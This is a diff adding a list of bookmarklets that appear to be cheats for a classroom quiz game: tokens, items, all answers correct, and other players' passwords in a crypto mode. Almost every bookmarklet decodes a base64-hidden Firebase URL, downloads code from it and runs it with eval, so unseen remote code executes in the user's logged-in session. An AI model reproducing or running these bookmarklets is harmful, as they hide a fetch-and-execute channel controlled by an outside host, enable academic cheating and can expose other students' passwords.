@@ -1,1 +1,86 @@
-soon...
+LIKELY OLD SOME MAY NOT WORK
+
+
+AddTokens
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxBZGRUb2tlbnMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Adds tokens to a specified system or game.
+
+SpamBox
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxTcGFtT3BlbkJveGVzLmpzb24=')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Likely triggers some type of spam action in a system.
+
+SellDupe
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxTZWxsRHVwZUJsb29rcy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Sells duplicate items, likely in a game or system.
+
+GetAllBlooks
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxHZXRBbGxCbG9vc3MuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Retrieves all "blooks" (items or characters in a system).
+
+BypassRandomName
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxCeXBhc3NOYW1lLmpzb24=')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Bypasses random name generation in a game or system.
+
+AllAnswersCorrect
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxFdmVyeUFuc3dlckNvcnJlY3QuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Sets all answers to be correct, possibly in a quiz or test environment.
+
+FrienzySetWeight
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9mclNldFdlaWdodC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Sets the weight in a "Frienzy" game or system.
+
+ClearEnemiesTowerDefense
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90ZENsZWFyRW5lbWllcy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Clears enemies in a Tower Defense game.
+
+ChangeRoundTowerDefense
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90ZENoYW5nZUdhbWVSb3VuZC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Changes the round in a Tower Defense game.
+
+GetCashTowerDefense
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90ZEdldENhc2guanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Grants cash in a Tower Defense game.
+
+GetOtherPasswordsCrypto
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jcnlwdG9HZXRPdGhlcnNQYXNzd29yZHMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Retrieves other passwords for a crypto system.
+
+GetCrypto
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jcnlwdG9HZXRDcnlwdG8uanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Retrieves cryptocurrency-related data.
+
+GetCash
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9mYWN0b3J5R2V0Q2FzaC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Gets cash, likely in a game or system.
+
+GetMegaBot
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9mYWN0b3J5R2V0TWVnYUJvdC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Retrieves a mega bot, possibly in a game.
+
+GetCoins
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jYWZlR2V0Q29pbnMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Retrieves coins in a game or system.
+
+InfiniteFoodLevel
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jYWZlSW5maW5pdGVGb29kTGV2ZWwuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Sets food level to infinite, likely in a game.
+
+StockInfiniteFood
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jYWZlU3RvY2tJbmZpbml0ZUZvb2QuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Stocks infinite food in a game or system.
+
+GetGoodChests
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nb2xkQ2hlc3RFU1AuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Retrieves good chests, likely in a game.
+
+GetGold
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nY2V0R29sZC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Retrieves gold in a game or system.
+
+GetAllTokens
+javascript:fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nY2V0QWxsVG9rZW5zLmpzb24=')).then(res => res.text()).then(t => eval(JSON.parse(t)));
+Description: Retrieves all tokens in a system.
+
+RefreshPage
+javascript:window.location.reload();
+Description: Refreshes the current page.
